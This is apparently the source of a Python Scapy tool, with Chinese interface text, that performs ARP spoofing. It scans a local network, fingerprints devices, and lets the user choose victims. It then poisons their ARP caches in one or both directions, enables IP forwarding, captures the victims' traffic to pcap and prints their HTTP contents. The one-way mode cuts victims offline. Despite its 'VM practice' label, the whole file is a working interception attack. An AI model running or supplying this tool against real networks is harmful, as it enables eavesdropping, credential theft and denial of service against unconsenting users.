from scapy.all import ARP, sendp, get_if_list, get_if_hwaddr, Ether, srp, IP, ICMP, sniff, Raw, TCP, wrpcap
import time
import sys
import os
import ctypes
import logging
from datetime import datetime
import threading
import re

class bcolors:
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'

target_ips = []
gateway_ip = ""
interface = ""
packet_count = 0
start_time = 0
restore_flag = False
traffic_stats = {"upload": 0, "download": 0}
log_file = ""
capture_file = ""
capture_count = 0
device_types = {}

def init_log():
    global log_file
    log_dir = "arp_spoof_logs"
    os.makedirs(log_dir, exist_ok=True)
    log_name = f"spoof_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log"
    log_file = os.path.join(log_dir, log_name)
    logging.basicConfig(
        filename=log_file,
        level=logging.INFO,
        format="%(asctime)s - %(levelname)s - %(message)s"
    )
    logging.info("ARP欺骗工具启动（含流量嗅探+自动抓包+设备识别）")

def identify_device(ip, mac):
    if ip in device_types:
        return device_types[ip]
    phone_vendors = ["00:1A:7D", "00:24:EE", "38:E7:D8", "5C:CA:D3", "78:2B:CB", "8C:85:90", "9C:B6:D0", "A8:9C:ED", "D0:9C:23"]
    pc_vendors = ["00:0C:29", "00:1E:4F", "00:23:5A", "00:50:56", "18:66:DA", "28:6E:D4", "3C:97:0E", "52:54:00", "80:EE:73"]
    router_vendors = ["00:00:0C", "00:1E:58", "00:22:75", "00:26:B6", "00:37:6D", "00:90:4C", "10:FE:ED", "40:8D:5C", "70:4C:A5"]
    device_type = "未知设备"
    mac_prefix = mac[:8].upper()
    if any(vendor in mac_prefix for vendor in phone_vendors):
        device_type = "手机"
    elif any(vendor in mac_prefix for vendor in pc_vendors):
        device_type = "电脑"
    elif any(vendor in mac_prefix for vendor in router_vendors):
        device_type = "路由器"
    else:
        try:
            pkt = IP(dst=ip)/ICMP()
            resp = sr1(pkt, timeout=2, verbose=0)
            if resp:
                ttl = resp.ttl
                if ttl == 64:
                    device_type = "手机/平板"
                elif ttl == 128:
                    device_type = "电脑（Windows）"
                elif ttl == 255:
                    device_type = "路由器/网络设备"
        except:
            pass
    device_types[ip] = device_type
    logging.info(f"设备识别：{ip} | {mac} → {device_type}")
    return device_type

def get_mac(ip):
    try:
        arp_request = ARP(pdst=ip)
        broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast / arp_request
        answered_list = srp(arp_request_broadcast, timeout=2, verbose=0)[0]
        mac = answered_list[0][1].hwsrc
        logging.info(f"获取IP {ip} 的MAC地址：{mac}")
        return mac
    except Exception as e:
        logging.error(f"获取IP {ip} 的MAC地址失败：{str(e)}")
        return None

def scan_lan(interface, gateway_ip):
    print(f"\n{bcolors.BOLD}[*] 开始扫描局域网在线设备（含设备类型识别）...{bcolors.ENDC}")
    logging.info("开始局域网扫描+设备识别")
    lan_ip = gateway_ip.rsplit('.', 1)[0] + ".1/24"
    arp_request = ARP(pdst=lan_ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = srp(arp_request_broadcast, timeout=10, iface=interface, verbose=0)[0]
    online_devices = []
    for element in answered_list:
        ip = element[1].psrc
        mac = element[1].hwsrc
        if ip != gateway_ip:
            device_type = identify_device(ip, mac)
            online_devices.append({"ip": ip, "mac": mac, "type": device_type})
            print(f"{bcolors.OKGREEN}[+] 在线设备：{ip} | {mac} | {device_type}{bcolors.ENDC}")
    logging.info(f"局域网扫描完成，发现 {len(online_devices)} 个在线设备")
    return online_devices

def select_targets(devices):
    print(f"\n{bcolors.BOLD}[*] 请选择要欺骗的设备（支持多个，用逗号分隔序号，如 1,3,5）{bcolors.ENDC}")
    for i, dev in enumerate(devices):
        print(f"{i+1}. {dev['ip']} | {dev['mac']} | {dev['type']}")
    while True:
        choice = input(f"{bcolors.BOLD}[*] 输入选择（直接回车选择全部）：{bcolors.ENDC}")
        if not choice:
            return [dev['ip'] for dev in devices]
        try:
            indices = [int(x.strip())-1 for x in choice.split(',')]
            targets = [devices[i]['ip'] for i in indices if 0 <= i < len(devices)]
            if targets:
                logging.info(f"选择欺骗目标：{','.join(targets)}")
                return targets
            else:
                print(f"{bcolors.FAIL}[-] 选择无效，请重新输入{bcolors.ENDC}")
        except:
            print(f"{bcolors.FAIL}[-] 输入格式错误，请输入序号（如 1,3）{bcolors.ENDC}")

def packet_sniffer(packet):
    global capture_count, traffic_stats
    if packet.haslayer(IP):
        src_ip = packet[IP].src
        dst_ip = packet[IP].dst
        pkt_len = len(packet)
        if src_ip in target_ips or dst_ip in target_ips:
            capture_count += 1
            if src_ip in target_ips:
                traffic_stats["upload"] += pkt_len
            if dst_ip in target_ips:
                traffic_stats["download"] += pkt_len
            if capture_file:
                wrpcap(capture_file, packet, append=True)
                if packet.haslayer(TCP) and (packet[TCP].dport == 80 or packet[TCP].sport == 80):
                    if packet.haslayer(Raw):
                        http_data = packet[Raw].load[:200]
                        logging.info(f"HTTP流量捕获：{src_ip} → {dst_ip} | {http_data[:50]}...")
                        print(f"\n{bcolors.WARNING}[抓包] HTTP 流量：{src_ip} → {dst_ip}{bcolors.ENDC}")
                        print(f"数据预览：{http_data.decode('utf-8', errors='ignore')}")

def start_sniffing():
    global capture_file
    capture_dir = "arp_captures"
    os.makedirs(capture_dir, exist_ok=True)
    capture_name = f"capture_{datetime.now().strftime('%Y%m%d_%H%M%S')}.pcap"
    capture_file = os.path.join(capture_dir, capture_name)
    print(f"\n{bcolors.OKGREEN}[+] 流量嗅探已启动，抓包文件：{capture_file}{bcolors.ENDC}")
    logging.info(f"启动流量嗅探，抓包保存至：{capture_file}")
    sniff_filter = " or ".join([f"host {ip}" for ip in target_ips])
    sniff(iface=interface, filter=sniff_filter, prn=packet_sniffer, store=0, stop_filter=lambda x: restore_flag)

def spoof(target_ip, spoof_ip, interface):
    global packet_count
    target_mac = get_mac(target_ip)
    if not target_mac:
        print(f"{bcolors.FAIL}[-] 无法获取 {target_ip} 的MAC地址，跳过该目标{bcolors.ENDC}")
        return
    arp_response = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    sendp(arp_response, iface=interface, verbose=0)
    packet_count += 1
    traffic_stats["upload"] += len(arp_response)
    logging.info(f"向 {target_ip} 发送欺骗包（伪装成 {spoof_ip}）")

def restore(destination_ip, source_ip, interface):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    if destination_mac and source_mac:
        arp_response = ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
        sendp(arp_response, iface=interface, verbose=0, count=3)
        logging.info(f"恢复 {destination_ip} 的ARP缓存（源IP：{source_ip}）")
        print(f"{bcolors.OKGREEN}[+] 已恢复 {destination_ip} 的ARP缓存{bcolors.ENDC}")

def enable_ip_forward():
    if sys.platform.startswith("linux"):
        try:
            os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
            logging.info("Linux IP转发已开启")
            print(f"{bcolors.OKGREEN}[+] Linux IP 转发已开启，受害者可正常上网（方便抓包）{bcolors.ENDC}")
        except Exception as e:
            logging.error(f"开启Linux IP转发失败：{str(e)}")
            print(f"{bcolors.WARNING}[-] 开启IP转发失败，请手动执行：sudo echo 1 > /proc/sys/net/ipv4/ip_forward{bcolors.ENDC}")
    elif sys.platform.startswith("win32"):
        logging.info("Windows用户需手动开启IP转发")
        print(f"\n{bcolors.WARNING}[!] Windows 手动开启IP转发教程：{bcolors.ENDC}")
        print("1. 按下 Win+R，输入 services.msc")
        print("2. 找到 '路由和远程访问'，右键启动")
        print("3. 启动后受害者可正常上网（需管理员权限）")

def select_interface():
    print(f"\n{bcolors.BOLD}[*] 可用网卡列表：{bcolors.ENDC}")
    ifaces = get_if_list()
    valid_ifaces = []
    for i, iface in enumerate(ifaces):
        try:
            mac = get_if_hwaddr(iface)
            valid_ifaces.append((i+1, iface, mac))
            print(f"  {i+1}. 网卡名：{iface} | MAC：{mac}")
        except:
            continue
    while True:
        choice = input(f"\n{bcolors.BOLD}[*] 请输入网卡序号：{bcolors.ENDC}")
        try:
            idx = int(choice)
            for num, iface, mac in valid_ifaces:
                if num == idx:
                    logging.info(f"选择网卡：{iface}（MAC：{mac}）")
                    return iface
            print(f"{bcolors.FAIL}[-] 序号无效，请重新选择{bcolors.ENDC}")
        except:
            print(f"{bcolors.FAIL}[-] 输入错误，请输入数字{bcolors.ENDC}")

def traffic_monitor():
    while not restore_flag:
        upload_mb = traffic_stats["upload"] / 1024 / 1024
        download_mb = traffic_stats["download"] / 1024 / 1024
        print(f"\r{bcolors.BOLD}[流量监控] 上传：{upload_mb:.2f}MB | 下载：{download_mb:.2f}MB | 抓包数：{capture_count}{bcolors.ENDC}", end="")
        sys.stdout.flush()
        time.sleep(1)

def main():
    global target_ips, gateway_ip, interface, start_time, restore_flag
    init_log()
    print(f"{bcolors.BOLD}{bcolors.OKGREEN}=====================================")
    print("        终极版 ARP 欺骗工具（虚拟机练习版）")
    print("  功能：局域网扫描+设备识别+批量欺骗+流量嗅探+自动抓包")
    print("====================================={bcolors.ENDC}")
    gateway_ip = input(f"\n{bcolors.BOLD}[*] 请输入网关IP（路由器）：{bcolors.ENDC}")
    interface = select_interface()
    online_devices = scan_lan(interface, gateway_ip)
    if not online_devices:
        print(f"{bcolors.FAIL}[-] 未发现在线设备，程序退出{bcolors.ENDC}")
        logging.error("未发现在线设备，程序退出")
        sys.exit()
    target_ips = select_targets(online_devices)
    print(f"\n{bcolors.BOLD}[*] 欺骗模式：{bcolors.ENDC}")
    print("1. 双向欺骗（受害者 ↔ 网关，推荐，方便抓包）")
    print("2. 单向欺骗（受害者 → 网关，受害者断网）")
    mode = input(f"{bcolors.BOLD}[*] 选择模式（1/2，默认1）：{bcolors.ENDC}") or "1"
    print(f"\n{bcolors.WARNING}[!] 虚拟机练习提示：当前仅欺骗目标：{','.join(target_ips)}{bcolors.ENDC}")
    print(f"网关IP：{gateway_ip} | 网卡：{interface} | 模式：{'双向' if mode=='1' else '单向'}")
    print(f"{bcolors.WARNING}[!] 抓包文件将保存为PCAP格式，可用Wireshark打开分析{bcolors.ENDC}")
    confirm = input(f"{bcolors.BOLD}[*] 确认开始？（y/n）：{bcolors.ENDC}").lower()
    if confirm != "y":
        print(f"{bcolors.OKGREEN}[+] 已取消操作{bcolors.ENDC}")
        logging.info("用户取消操作")
        sys.exit()
    enable_ip_forward()
    monitor_thread = threading.Thread(target=traffic_monitor)
    monitor_thread.daemon = True
    monitor_thread.start()
    sniff_thread = threading.Thread(target=start_sniffing)
    sniff_thread.daemon = True
    sniff_thread.start()
    start_time = time.time()
    print(f"\n{bcolors.OKGREEN}[+] 欺骗+嗅探已启动！按 Ctrl+C 停止并恢复{bcolors.ENDC}")
    logging.info(f"开始欺骗，目标：{','.join(target_ips)}，模式：{'双向' if mode=='1' else '单向'}")
    try:
        while True:
            for target_ip in target_ips:
                if mode == "1":
                    spoof(target_ip, gateway_ip, interface)
                    spoof(gateway_ip, target_ip, interface)
                else:
                    spoof(target_ip, gateway_ip, interface)
            elapsed = time.time() - start_time
            print(f"\r{bcolors.BOLD}[*] 已发送 {packet_count} 个包 | 持续时间：{elapsed:.1f} 秒{bcolors.ENDC}", end="")
            sys.stdout.flush()
            time.sleep(0.5)
    except KeyboardInterrupt:
        restore_flag = True
        print(f"\n\n{bcolors.WARNING}[-] 收到停止信号，正在恢复ARP缓存...{bcolors.ENDC}")
        logging.info("用户停止欺骗，开始恢复ARP缓存")
    finally:
        if restore_flag:
            for target_ip in target_ips:
                restore(target_ip, gateway_ip, interface)
                restore(gateway_ip, target_ip, interface)
            if sys.platform.startswith("linux"):
                os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
                logging.info("Linux IP转发已关闭")
                print(f"{bcolors.WARNING}[-] Linux IP 转发已关闭{bcolors.ENDC}")
        elapsed = time.time() - start_time
        upload_mb = traffic_stats["upload"] / 1024 / 1024
        download_mb = traffic_stats["download"] / 1024 / 1024
        print(f"\n\n{bcolors.BOLD}[*] 练习统计报告：{bcolors.ENDC}")
        print(f"目标数量：{len(target_ips)} 个")
        print(f"设备类型分布：{[device_types[ip] for ip in target_ips]}")
        print(f"发送欺骗包：{packet_count} 个")
        print(f"持续时间：{elapsed:.1f} 秒")
        print(f"上传流量：{upload_mb:.2f} MB")
        print(f"下载流量：{download_mb:.2f} MB")
        print(f"捕获数据包：{capture_count} 个")
        print(f"日志文件：{log_file}")
        print(f"抓包文件：{capture_file}（可用Wireshark打开）")
        print(f"{bcolors.OKGREEN}[+] 练习结束，所有受害者网络已恢复{bcolors.ENDC}")
        logging.info(f"练习结束，持续时间：{elapsed:.1f}秒，发送包数：{packet_count}，抓包数：{capture_count}")

if __name__ == "__main__":
    try:
        is_admin = False
        if sys.platform.startswith("linux"):
            is_admin = os.geteuid() == 0
        elif sys.platform.startswith("win32"):
            is_admin = ctypes.windll.shell32.IsUserAnAdmin()
        if not is_admin:
            print(f"{bcolors.FAIL}[-] 请以管理员/root权限运行！{bcolors.ENDC}")
            sys.exit()
    except:
        print(f"{bcolors.FAIL}[-] 权限检查失败，请以管理员/root权限运行！{bcolors.ENDC}")
        sys.exit()
    main()